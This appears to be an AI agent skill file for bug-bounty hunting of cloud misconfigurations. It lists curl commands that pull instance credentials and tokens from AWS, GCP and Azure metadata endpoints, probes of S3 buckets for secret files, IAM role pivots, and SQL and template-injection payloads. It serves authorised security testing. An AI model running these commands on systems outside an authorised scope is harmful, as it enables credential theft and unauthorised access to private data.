---
name: cloud-hunter
description: Cloud infrastructure misconfiguration hunting for AWS, GCP, and Azure. Use when testing cloud assets, finding exposed S3 buckets, hunting IAM misconfigs, or testing serverless applications.
---

# Cloud Hunter

Cloud misconfigs are low-hanging fruit that pay $500-$50,000. Exposed buckets, overprivileged IAM, public databases — automated tools miss the creative ones.

## When to Use

- Testing cloud-hosted applications
- Hunting exposed S3/GCS/Azure Blob storage
- Auditing IAM policies and roles
- Testing serverless functions (Lambda/Cloud Functions)
- Finding cloud metadata endpoint access
- Assessing container security (EKS/GKE/AKS)

## The Process

1. **Inventory cloud assets** — enumerate services, roles, and configurations in scope
2. **Assess configurations** — check against security best practices and CIS benchmarks
3. **Test access controls** — verify IAM policies, network ACLs, and security group rules
4. **Validate logging** — ensure audit trails are enabled and properly retained
5. **Document and remediate** — report findings with specific configuration changes needed
### 1. Cloud Asset Discovery

```
# S3 bucket enumeration
# Pattern: {company}-{env}-{purpose}
# Try: company-prod, company-staging, company-backup, company-logs
# Tools: cloud_enum, S3Scanner, bucket-finder

# Subdomain → Cloud service mapping
# CNAME → *.s3.amazonaws.com (S3)
# CNAME → *.cloudfront.net (CloudFront)
# CNAME → *.azurewebsites.net (Azure App Service)
# CNAME → *.googleusercontent.com (GCP)

# Certificate transparency for cloud assets
# Search crt.sh for *.target.com
# Look for: s3, cloudfront, azure, gcp subdomains
```

### 2. S3 Bucket Attacks

#### Public Bucket Discovery
```bash
# Check if bucket is publicly listable
curl https://BUCKET.s3.amazonaws.com/
curl https://s3.amazonaws.com/BUCKET/

# List objects
aws s3 ls s3://BUCKET --no-sign-request

# Check specific files
curl https://BUCKET.s3.amazonaws.com/.env
curl https://BUCKET.s3.amazonaws.com/backup.sql
curl https://BUCKET.s3.amazonaws.com/config.json
curl https://BUCKET.s3.amazonaws.com/.git/config
```

#### Bucket Misconfigurations
- **Public read**: Anyone can list and download objects
- **Public write**: Anyone can upload (malware hosting, phishing)
- **ACL misconfigured**: AuthenticatedUsers group has access
- **Policy too permissive**: `"Principal": "*"` in bucket policy
- **Versioning enabled + public**: Old versions may contain deleted secrets

### 3. IAM Exploitation

#### Overprivileged Roles
```json
// Look for these dangerous policies:
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}

// Or overly permissive:
"Action": ["iam:*", "sts:*", "s3:*", "lambda:*"]
```

#### Privilege Escalation Paths
```
iam:PassRole + lambda:CreateFunction → Execute code with any role
iam:AttachUserPolicy → Give yourself admin
iam:CreateAccessKey → Get permanent credentials
sts:AssumeRole → Pivot to other accounts
ec2:RunInstance → Launch instance with instance profile
```

#### Cross-Account Access
```
# Check trust policies
aws iam get-role --role-name ROLE_NAME
# Look for: "Principal": {"AWS": "arn:aws:iam::OTHER_ACCOUNT:root"}

# If trusted account is compromised → assume role
aws sts assume-role --role-arn arn:aws:iam::TARGET:role/ROLE --role-session-name hack
```

### 4. Metadata Endpoint Attacks

```
# IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
curl -H "Metadata:true" \
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 5. Serverless Attacks

#### Lambda/Cloud Functions
```
# Environment variables often contain secrets
aws lambda get-function-configuration --function-name NAME

# Code injection via input
# If Lambda processes user input unsafely:
{"body": "'; DROP TABLE users; --"}
{"body": "{{constructor.constructor('return this')().process.env}}"}

# Lambda layer poisoning
# If you can modify layers → all functions using that layer are compromised
```

### 6. Database Exposure

```
# Public RDS instances
# Check security groups for 0.0.0.0/0 on port 3306/5432

# Public ElasticSearch
# Look for: *.es.amazonaws.com with open access

# Public Redis/Memcached
# Port 6379/11211 accessible from internet

# MongoDB without auth
# Port 27017 accessible, no authentication required
```

### 7. Container Security

```
# Kubernetes API server exposure
curl https://K8S_API:6443/api/v1/namespaces

# kubelet API
curl https://NODE:10255/pods

# Container escape via privileged mode
# If container runs as privileged:
# Can access host filesystem, load kernel modules

# Image scanning
# Look for secrets in Docker images
docker history IMAGE --no-trunc
docker inspect IMAGE
```

## Quick Wins (Most Common Findings)

| Finding | Frequency | Payout |
|---------|-----------|--------|
| Public S3 bucket with sensitive data | Very common | $500-$5000 |
| IAM policy with `*:*` | Common | $1000-$10000 |
| Metadata endpoint accessible from SSRF | Common | $1000-$5000 |
| Public database (RDS/ES/Redis) | Less common | $2000-$10000 |
| Lambda env vars with secrets | Common | $500-$5000 |
| Cross-account role trust misconfigured | Less common | $5000-$50000 |

## When NOT to Use

- Task is outside your authorization scope
- You need to implement controls (use implementing-* skills)
- Task is about analysis, not action (use analyzing-* skills)
- You don't have access to target systems
- Task requires compliance expertise (consult professionals)
- Task is about defense, not offense (use defensive skills)


## Red Flags

- Accessing real production data during testing
- Modifying IAM policies or roles
- Launching resources in someone's account
- Exfiltrating data from exposed buckets
- Not documenting scope of access

## Verification

- All findings demonstrate actual access (not just theoretical)
- Screenshots of accessed data (sanitized)
- IAM policies documented with specific overprivileged actions
- Metadata endpoint access proven with credential dump (sanitized)
- Remediation specific to the cloud provider

## Tools

| Purpose | Tools |
|---------|-------|
| Enumeration | cloud_enum, S3Scanner, Pacu, ScoutSuite |
| IAM analysis | IAM Access Analyzer, CloudMapper |
| Metadata | curl, IMDS packet capture |
| Container | kube-hunter, kubeaudit, trivy |
| Serverless | lambda-layers, serverless-prey |
